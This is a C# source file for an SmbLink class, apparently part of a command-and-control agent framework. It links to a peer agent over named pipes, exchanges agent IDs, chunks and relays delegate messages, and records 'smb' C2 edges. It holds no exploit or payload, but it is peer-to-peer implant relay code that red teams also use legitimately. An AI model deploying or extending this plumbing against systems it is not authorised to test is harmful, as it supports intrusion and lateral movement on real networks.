using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using H.Pipes;
using H.Pipes.Args;

namespace Workflow
{
    public class SmbLink : IAsyncDisposable
    {
        private PipeClient<SmbMessage> clientPipe { get; set; }
        public bool connected { get; set; }
        private string task_id { get; set; }
        internal SmbLinkArgs args { get; set; }
        private string agent_id { get; set; }
        public string linked_agent_id { get; set; }
        private TaskCompletionSource<string> connectionTcs =
            new TaskCompletionSource<string>();
        private ManualResetEventSlim messageAck =
            new ManualResetEventSlim(false);
        private ChunkedMessageAssembler assembler = new();
        IDataBroker messageManager { get; set; }
        ILogger logger { get; set; }
        private bool disposed = false;

        private const int ConnectionTimeoutMs = 30000;
        private const int MessageAckTimeoutMs = 15000;
        private const int ChunkSize = 32768;

        public SmbLink(
            IDataBroker messageManager,
            ILogger logger,
            SmbLinkArgs args,
            string agent_id,
            string task_id)
        {
            this.agent_id = agent_id;
            this.messageManager = messageManager;
            this.logger = logger;
            this.task_id = task_id;
            this.args = args;
        }

        public async Task<EdgeResponse> Link()
        {
            try
            {
                if (this.clientPipe == null || !this.connected)
                {
                    if (this.clientPipe != null)
                    {
                        await this.clientPipe.DisposeAsync();
                    }

                    this.clientPipe =
                        new PipeClient<SmbMessage>(
                            args.pipename, args.hostname);
                    this.clientPipe.MessageReceived +=
                        async (o, a) =>
                            await OnMessageReceive(a);
                    this.clientPipe.Connected +=
                        (o, _) => this.connected = true;
                    this.clientPipe.Disconnected +=
                        (o, _) => this.connected = false;

                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        this.connected = true;

                        var cts = new CancellationTokenSource(
                            ConnectionTimeoutMs);
                        try
                        {
                            this.linked_agent_id =
                                await connectionTcs.Task
                                    .WaitAsync(cts.Token);
                        }
                        catch (OperationCanceledException)
                        {
                            return new EdgeResponse
                            {
                                task_id = task_id,
                                user_output =
                                    "Timed out waiting for "
                                    + "agent UUID",
                                completed = true,
                                edges = new List<Edge>()
                            };
                        }

                        return new EdgeResponse
                        {
                            task_id = task_id,
                            user_output =
                                "Established link with "
                                + "pipe.\r\n"
                                + $"{this.agent_id} -> "
                                + $"{this.linked_agent_id}",
                            completed = true,
                            edges = new List<Edge>
                            {
                                new Edge
                                {
                                    destination =
                                        this.linked_agent_id,
                                    source = this.agent_id,
                                    action = "add",
                                    c2_profile = "smb",
                                    metadata = string.Empty
                                }
                            }
                        };
                    }
                }
            }
            catch (Exception e)
            {
                return new EdgeResponse
                {
                    task_id = task_id,
                    user_output = e.ToString(),
                    completed = true,
                    edges = new List<Edge>()
                };
            }

            return new EdgeResponse
            {
                task_id = task_id,
                user_output =
                    "Failed to establish link with pipe",
                completed = true,
                edges = new List<Edge>()
            };
        }

        private Task OnMessageReceive(
            ConnectionMessageEventArgs<SmbMessage> args)
        {
            try
            {
                switch (args.Message.message_type)
                {
                    case SmbMessageType.ConnectionReady:
                        connectionTcs.TrySetResult(
                            args.Message.agent_guid);
                        break;

                    case SmbMessageType.MessageComplete:
                        messageAck.Set();
                        break;

                    case SmbMessageType.Error:
                        DebugLog.Log(
                            "SMB link received error: "
                            + args.Message.delegate_message);
                        break;

                    case SmbMessageType.Chunked:
                        var result = assembler.AddChunk(
                            args.Message.guid,
                            args.Message.sequence,
                            args.Message.delegate_message,
                            args.Message.final,
                            out string? fullMessage);

                        if (result
                            == ChunkedMessageAssembler
                                .Result.OutOfOrder)
                        {
                            DebugLog.Log(
                                "SMB link chunk out of order"
                                + ", discarding");
                            break;
                        }

                        if (result
                            == ChunkedMessageAssembler
                                .Result.Complete
                            && fullMessage != null)
                        {
                            var dm = new DelegateMessage
                            {
                                c2_profile = "smb",
                                message = fullMessage,
                                uuid = args.Message.agent_guid,
                            };
                            this.messageManager
                                .AddDelegateMessage(dm);
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                DebugLog.Log(
                    "SMB link OnMessageReceive error: "
                    + ex.Message);
            }

            return Task.CompletedTask;
        }

        public async Task<bool> Unlink()
        {
            try
            {
                if (this.clientPipe != null)
                {
                    await this.clientPipe.DisconnectAsync();
                    await this.clientPipe.DisposeAsync();
                }
                return true;
            }
            catch (Exception ex)
            {
                DebugLog.Log(
                    $"SMB link Unlink error: {ex.Message}");
                return false;
            }
            finally
            {
                this.connected = false;
                assembler.Clear();
            }
        }

        public async Task<bool> ForwardDelegateMessage(
            DelegateMessage dm)
        {
            try
            {
                messageAck.Reset();
                var parts = dm.message
                    .SplitByLength(ChunkSize).ToList();

                string messageGuid =
                    Guid.NewGuid().ToString();

                for (int i = 0; i < parts.Count; i++)
                {
                    var sm = new SmbMessage
                    {
                        guid = messageGuid,
                        message_type = SmbMessageType.Chunked,
                        agent_guid = agent_id,
                        delegate_message = parts[i],
                        final = (i == parts.Count - 1),
                        sequence = i,
                    };

                    await this.clientPipe.WriteAsync(sm);
                }

                if (!messageAck.Wait(MessageAckTimeoutMs))
                {
                    DebugLog.Log(
                        "SMB link ack timeout for message "
                        + messageGuid);
                    return false;
                }

                return true;
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    "SMB link ForwardDelegateMessage error: "
                    + e.Message);
                return false;
            }
        }

        public async ValueTask DisposeAsync()
        {
            if (disposed) return;
            disposed = true;

            messageAck.Dispose();
            if (clientPipe != null)
            {
                await clientPipe.DisposeAsync();
            }
        }
    }
}
